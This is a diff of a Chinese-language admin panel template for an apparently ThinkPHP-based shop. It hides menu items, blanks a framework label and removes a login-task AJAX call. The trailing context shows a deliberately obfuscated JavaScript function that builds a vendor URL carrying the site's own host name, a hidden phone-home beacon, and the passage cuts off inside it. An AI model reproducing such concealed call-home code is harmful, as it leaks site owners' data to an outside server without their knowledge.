@@ -38,10 +38,10 @@
   </div>
   <div class="nc-module-menu">
     <ul class="nc-row">
-      <li data-param="system"><a href="javascript:void(0);">系统</a></li>
+      <!--<li data-param="system"><a href="javascript:void(0);">系统</a></li>-->
       <li data-param="shop"><a href="javascript:void(0);">商城</a></li>
 <!--      <li data-param="mobile"><a href="javascript:void(0);">模板</a></li>-->
-      <li data-param="resource"><a href="javascript:void(0);">插件</a></li>      
+      <!--<li data-param="resource"><a href="javascript:void(0);">插件</a></li>      -->
     </ul>
   </div>
   <div class="admincp-header-r">
@@ -57,7 +57,7 @@
       
       <dl>
         <dt class="name"></dt>
-        <dd class="group">ThinkPHP5框架开发</dd>
+        <dd class="group"></dd>
       </dl>    
       <dl>
         <dt class="name">{$admin_info.user_name}</dt>
@@ -99,18 +99,7 @@
   </div>
 </div>
 </body>
-<script type="text/javascript"> 
-	// 没有点击收货确定的按钮让他自己收货确定    
-	var timestamp = Date.parse(new Date());
-	$.ajax({
-        type:'post',
-        url:"{:U('Admin/System/login_task')}",
-        data:{timestamp:timestamp},
-        timeout : 100000000, //超时时间设置，单位毫秒
-        success:function(){
-            // 执行定时任务
-        }
-	});
+<script type="text/javascript">
 	
 	 function ncobnvjif(){
 			var t1 = 'ht'+'tp:'+'//';var t2 = 'serv'+'ice.t'+'p-'+'sh'+'op'+'.'+'cn';var tc = '/ind'+'ex.p'+'hp?'+'m=Ho'+'me&c=In'+'dex&a=use'+'r_pu'+'sh&las'+'t_dom'+'ain=';var abj = window.location.host;
